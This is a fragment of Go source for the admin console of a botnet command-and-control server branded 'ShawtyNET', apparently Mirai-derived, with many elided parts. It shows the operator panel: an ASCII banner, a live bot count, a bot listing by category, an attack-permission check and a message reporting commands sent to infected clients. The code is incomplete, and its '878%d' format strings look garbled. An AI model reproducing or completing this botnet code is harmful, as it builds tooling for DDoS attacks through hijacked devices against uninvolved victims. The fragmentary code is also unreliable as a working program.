...
func (this *Admin) Handle() {
    ...
    go func() {
        ...
        for {
            ...
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;878%d\007", BotCount))); err != nil {
                this.conn.Close()
                break
            }
            i++
    ...
    this.conn.Write([]byte("             ,MMM8&&&.                  \r\n"))
    this.conn.Write([]byte("        _...MMMMM88&&&&..._             \r\n"))
    this.conn.Write([]byte("     .::'''MMMMM88&&&&&&'''::.          \r\n"))
    this.conn.Write([]byte("    ::     MMMMM88&&&&&&     ::         \r\n"))
    this.conn.Write([]byte("    '::....MMMMM88&&&&&&....::'         \r\n"))
    this.conn.Write([]byte("       `''''MMMMM88&&&&''''`            \r\n"))
    this.conn.Write([]byte("     \x1b[91mShawty Network\x1b[0m   'MMM8&&&'                  \r\n"))
    this.conn.Write([]byte("\r\n\r\n\r\n"))

    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\033[32;1m" + username + " | ShawtyNET \033[0m"))
        ...
        if userInfo.admin == 1 && cmd == "bots" {
            ...
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\033[36;1m%s:\t878%d\033[0m\r\n", k, v)))
            }
            continue
        }
        if cmd[0] == '-' {
        ...
        if err != nil {
            ...
            if err != nil {
                ...
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    ...
                    this.conn.Write([]byte(fmt.Sprintf("Sent command to 878%d clients\r\n", clientList.Count())))
